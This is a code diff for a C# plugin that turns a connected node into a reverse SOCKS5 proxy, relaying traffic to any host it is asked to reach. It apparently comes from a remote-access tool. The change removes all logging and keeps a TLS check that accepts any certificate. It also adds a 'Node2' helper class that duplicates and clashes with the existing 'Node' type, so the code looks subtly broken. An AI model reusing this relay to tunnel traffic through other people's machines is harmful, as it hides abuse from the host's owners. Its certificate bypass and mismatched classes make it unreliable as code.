@@ -14,26 +14,30 @@ namespace Plugin
     {
         public async Task Run(Node node)
         {
-            await node.SendAsync(new byte[] { 3 }); // Indicate connection
+            // Indicate reverse proxy connection
+            await node.SendAsync(new byte[] { 3 });
 
             while (node.Connected())
             {
                 try
                 {
+                    // Receive node ID (length-prefixed)
                     byte[] idBytes = await node.ReceiveAsync();
                     if (idBytes == null) break;
 
-                    int nodeId = node.sock.BytesToInt(idBytes);
-                    Node tempNode = node.Parent?.subNodes?.FirstOrDefault(n => n.SetId == nodeId);
+                    int nodeId = Node2.BytesToInt(idBytes);
 
+                    // Find or create subnode
+                    Node tempNode = node.Parent?.subNodes?.FirstOrDefault(n => n.SetId == nodeId);
                     if (tempNode == null)
                     {
-                        await node.SendAsync(new byte[] { 0 });
+                        await node.SendAsync(new byte[] { 0 }); // failed
                         continue;
                     }
 
-                    await node.SendAsync(new byte[] { 1 });
+                    await node.SendAsync(new byte[] { 1 }); // OK
                     node.AddSubNode(tempNode);
+
                     var handler = new Socks5Handler(tempNode);
                     _ = handler.StartAsync(); // fire-and-forget
                 }
@@ -60,7 +64,7 @@ namespace Plugin
         {
             try
             {
-                // Receive destination info from server/subnode
+                // Receive destination info (length-prefixed)
                 byte[] destAddrBytes = await subnode.ReceiveAsync();
                 byte[] portBytes = await subnode.ReceiveAsync();
                 byte[] timeoutBytes = await subnode.ReceiveAsync();
@@ -72,10 +76,8 @@ namespace Plugin
                 }
 
                 string destAddr = Encoding.UTF8.GetString(destAddrBytes);
-                int destPort = subnode.sock.BytesToInt(portBytes);
-                int timeout = subnode.sock.BytesToInt(timeoutBytes);
-
-                await LogAsync($"destAddr: {destAddr}, port: {destPort}, timeout: {timeout}");
+                int destPort = Node2.BytesToInt(portBytes);
+                int timeout = Node2.BytesToInt(timeoutBytes);
 
                 TcpClient remoteClient = new TcpClient
                 {
@@ -85,53 +87,26 @@ namespace Plugin
 
                 try
                 {
-                    await LogAsync("Connecting...");
                     await remoteClient.ConnectAsync(destAddr, destPort);
-                    await LogAsync("Connected.");
                 }
-                catch (SocketException ex)
+                catch
                 {
-                    await LogAsync($"SocketException: {ex.Message}");
-
-                    byte[] err;
-
-                    switch (ex.SocketErrorCode)
-                    {
-                        case SocketError.TimedOut:
-                            err = new byte[] { 2 };
-                            break;
-                        case SocketError.HostUnreachable:
-                            err = new byte[] { 3 };
-                            break;
-                        default:
-                            err = new byte[] { 4 };
-                            break;
-                    }
-
-                    await subnode.SendAsync(err);
+                    // Send failure code back
+                    await subnode.SendAsync(new byte[] { 4 });
                     subnode.Disconnect();
                     return;
                 }
 
-                // Send OK back to server/subnode
+                // Send OK
                 await subnode.SendAsync(new byte[] { 1 });
 
-                // Send local socket info back
-                IPEndPoint localEP = (IPEndPoint)remoteClient.Client.LocalEndPoint;
-                byte[] localAddr = localEP.Address.GetAddressBytes();
-                byte[] localPort = BitConverter.GetBytes((ushort)localEP.Port);
-                if (BitConverter.IsLittleEndian) Array.Reverse(localPort); // network byte order
-                await subnode.SendAsync(localAddr);
-                await subnode.SendAsync(localPort);
-
-                // Wrap in TLS for HTTPS if needed
+                // Optional: TLS for HTTPS
                 Stream remoteStream = remoteClient.GetStream();
-                if (destPort == 443) // HTTPS
+                if (destPort == 443)
                 {
-                    SslStream sslStream = new SslStream(remoteStream, false, (sender, certificate, chain, errors) => true);
-                    await sslStream.AuthenticateAsClientAsync(destAddr);
-                    remoteStream = sslStream;
-                    await LogAsync("TLS handshake completed.");
+                    var ssl = new SslStream(remoteStream, false, (sender, cert, chain, errs) => true);
+                    await ssl.AuthenticateAsClientAsync(destAddr);
+                    remoteStream = ssl;
                 }
 
                 // Start bidirectional relay
@@ -139,66 +114,123 @@ namespace Plugin
 
                 remoteClient.Close();
                 subnode.Disconnect();
-                await LogAsync("Disconnected.");
             }
-            catch (Exception ex)
+            catch
             {
-                await LogAsync("Error: " + ex.Message);
                 subnode.Disconnect();
             }
         }
 
-        // Relay loop between remote stream and subnode
         private async Task RelayLoop(Stream remoteStream, Node subnode)
         {
-            byte[] buffer = new byte[4096];
-            try
+            var buffer = new byte[4096];
+
+            while (subnode.Connected())
             {
-                while (subnode.Connected())
+                var readRemoteTask = remoteStream.ReadAsync(buffer, 0, buffer.Length);
+                var readNodeTask = subnode.ReceiveAsync();
+
+                var completed = await Task.WhenAny(readRemoteTask, readNodeTask);
+
+                if (completed == readRemoteTask)
                 {
-                    // Read from remote
-                    var readRemote = remoteStream.ReadAsync(buffer, 0, buffer.Length);
-                    var readSubnode = subnode.ReceiveAsync();
-
-                    var completed = await Task.WhenAny(readRemote, readSubnode);
-
-                    if (completed == readRemote)
-                    {
-                        int bytesRead = readRemote.Result;
-                        if (bytesRead == 0) break;
-                        await subnode.SendAsync(buffer.Take(bytesRead).ToArray());
-                    }
-                    else
-                    {
-                        byte[] data = await readSubnode;
-                        if (data == null || data.Length == 0) break;
-                        await remoteStream.WriteAsync(data, 0, data.Length);
-                        await remoteStream.FlushAsync();
-                    }
-
-                    await Task.Delay(10); // avoid tight loop
+                    int bytesRead = readRemoteTask.Result;
+                    if (bytesRead == 0) break;
+                    await subnode.SendAsync(buffer.Take(bytesRead).ToArray());
+                }
+                else
+                {
+                    byte[] data = await readNodeTask;
+                    if (data == null || data.Length == 0) break;
+                    await remoteStream.WriteAsync(data, 0, data.Length);
+                    await remoteStream.FlushAsync();
                 }
             }
-            catch { /* ignore relay errors */ }
+        }
+    }
+
+    // --- Node helper methods ---
+    public partial class Node2
+    {
+        public Socket sock;
+        public Node Parent;
+        public int SetId;
+        public System.Collections.Generic.List<Node> subNodes = new System.Collections.Generic.List<Node>();
+
+        public bool Connected() => sock != null && sock.Connected;
+
+        public async Task SendAsync(byte[] data)
+        {
+            if (sock == null || !sock.Connected) return;
+
+            byte[] lenPrefix = BitConverter.GetBytes(data.Length);
+            if (BitConverter.IsLittleEndian) Array.Reverse(lenPrefix);
+
+            byte[] sendBuffer = new byte[lenPrefix.Length + data.Length];
+            Array.Copy(lenPrefix, 0, sendBuffer, 0, lenPrefix.Length);
+            Array.Copy(data, 0, sendBuffer, lenPrefix.Length, data.Length);
+
+            int sent = 0;
+            while (sent < sendBuffer.Length)
+            {
+                int n = await sock.SendAsync(new ArraySegment<byte>(sendBuffer, sent, sendBuffer.Length - sent), SocketFlags.None);
+                if (n == 0) throw new SocketException();
+                sent += n;
+            }
         }
 
-        private readonly string logFile = "log.txt"; // define your log file path
-
-        private async Task LogAsync(string message)
+        public async Task<byte[]> ReceiveAsync()
         {
             try
             {
-                using (var fs = new FileStream(logFile, FileMode.Append, FileAccess.Write, FileShare.Read, 4096, useAsync: true))
-                using (var writer = new StreamWriter(fs))
+                byte[] lenBuf = new byte[4];
+                int r = await sock.ReceiveAsync(new ArraySegment<byte>(lenBuf), SocketFlags.None);
+                if (r != 4) return null;
+                if (BitConverter.IsLittleEndian) Array.Reverse(lenBuf);
+                int len = BitConverter.ToInt32(lenBuf, 0);
+
+                byte[] data = new byte[len];
+                int received = 0;
+                while (received < len)
                 {
-                    await writer.WriteLineAsync($"{DateTime.Now:HH:mm:ss} - {message}");
-                    await writer.FlushAsync();
+                    r = await sock.ReceiveAsync(new ArraySegment<byte>(data, received, len - received), SocketFlags.None);
+                    if (r == 0) return null;
+                    received += r;
                 }
+
+                return data;
             }
-            catch
+            catch { return null; }
+        }
+
+        public void Disconnect()
+        {
+            try
             {
-                // ignore logging errors
+                sock?.Shutdown(SocketShutdown.Both);
+                sock?.Close();
+                sock = null;
             }
+            catch { }
+        }
+
+        public static byte[] IntToBytes(int val)
+        {
+            byte[] b = BitConverter.GetBytes(val);
+            if (BitConverter.IsLittleEndian) Array.Reverse(b);
+            return b;
+        }
+
+        public static int BytesToInt(byte[] bytes)
+        {
+            if (bytes.Length == 2) { if (BitConverter.IsLittleEndian) Array.Reverse(bytes); return BitConverter.ToUInt16(bytes, 0); }
+            if (bytes.Length == 4) { if (BitConverter.IsLittleEndian) Array.Reverse(bytes); return BitConverter.ToInt32(bytes, 0); }
+            throw new ArgumentException("Invalid byte array length");
+        }
+
+        public void AddSubNode(Node n)
+        {
+            if (!subNodes.Contains(n)) subNodes.Add(n);
         }
     }
 }
